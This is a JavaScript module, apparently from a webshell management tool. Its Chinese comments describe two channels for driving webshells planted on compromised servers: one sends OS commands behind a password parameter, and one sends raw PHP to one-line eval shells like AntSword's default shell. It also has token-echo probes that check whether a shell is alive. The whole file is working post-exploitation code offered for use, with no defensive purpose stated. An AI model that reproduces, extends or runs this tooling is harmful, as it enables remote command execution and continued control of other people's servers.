// dsh-webshell-mgr cmd 双通道 codec：
//   - cmd-system：口令门 + 命令参数马（pass=<password>&<cmd>=<command>，POST/GET 可配）
//   - cmd-eval：一句话 eval 马（pass 参数直接携带语言代码；PHP 一等支持，结构化操作走
//     snippets.js 片段；蚁剑默认马与其默认/base64 编码器语义同形——编码器把载荷包成
//     PHP 代码文本，本通道发原始 PHP 代码即可命中 eval($_POST[x]) 形马）
// 两通道共享表单编码/头部/字符集解码管线。

import { httpRequest, decodeBody, cookieHeaderFor, absorbCookies } from "./http-client.js";

function formBody(pairs) {
	return pairs
		.filter(([, v]) => v !== undefined && v !== null && v !== "")
		.map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
		.join("&");
}

function mergeHeaders(conn, extra) {
	const headers = { ...(conn.headers ?? {}) };
	for (const [k, v] of Object.entries(extra ?? {})) headers[k] = v;
	const cookie = cookieHeaderFor(conn.__scope ?? conn.id ?? conn.url);
	if (cookie) headers["cookie"] = cookie;
	return headers;
}

/** 表单/原文发送一次。 */
async function sendForm(conn, { params = {}, rawBody = null, headers = {} }) {
	const url = conn.method === "get" && rawBody === null
		? `${conn.url}${conn.url.includes("?") ? "&" : "?"}${formBody(Object.entries(params))}`
		: conn.url;
	const isGet = conn.method === "get" && rawBody === null;
	const res = await httpRequest({
		url,
		method: isGet ? "GET" : "POST",
		headers: mergeHeaders(conn, {
			...(isGet || Buffer.isBuffer(rawBody) ? {} : { "content-type": "application/x-www-form-urlencoded" }),
			...headers
		}),
		body: isGet ? null : (rawBody !== null ? rawBody : formBody(Object.entries(params))),
		timeoutMs: conn.timeoutMs
	});
	absorbCookies(conn.__scope ?? conn.id ?? conn.url, res.headers);
	const output = decodeBody(res.bodyBuffer, conn.encoding, res.headers["content-type"]);
	return { status: res.status, output };
}

/** cmd-system：执行 OS 命令。 */
export async function systemExec(conn, command) {
	const params = {};
	if (conn.password) params[conn.pass_param || "pass"] = conn.password;
	params[conn.cmd_param || "cmd"] = command;
	const r = await sendForm(conn, { params });
	if (r.status === 0 || r.status >= 500) throw new Error(`目标响应异常（HTTP ${r.status}）`);
	return r.output;
}

/** cmd-eval：执行 PHP 代码并返回输出。 */
export async function phpEval(conn, code) {
	const r = await sendForm(conn, { params: { [conn.pass_param || "pass"]: code } });
	if (r.status === 0) throw new Error(`目标不可达（HTTP ${r.status}）`);
	return r.output;
}

/** 探测：token 回显。 */
const probeToken = () => "WSMP" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probeSystem(conn) {
	const token = probeToken();
	const out = await systemExec({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 8000) }, `echo ${token}`);
	return out.includes(token) ? { tokenOutput: out } : null;
}

export async function probeEvalPhp(conn) {
	const token = probeToken();
	const out = await phpEval({ ...conn, timeoutMs: Math.min(conn.timeoutMs, 8000) }, `echo "${token}";`);
	return out.includes(token) ? { tokenOutput: out } : null;
}

export const cmdSystemCodec = {
	id: "cmd-system",
	label: "一句话（命令通道）",
	langs: ["php", "jsp", "aspx"],
	caps: { cmd: true, code: false },
	exec: systemExec
};

export const cmdEvalCodec = {
	id: "cmd-eval",
	label: "一句话（eval 通道）",
	langs: ["php"],
	caps: { cmd: true, code: true },
	execPhp: phpEval
};
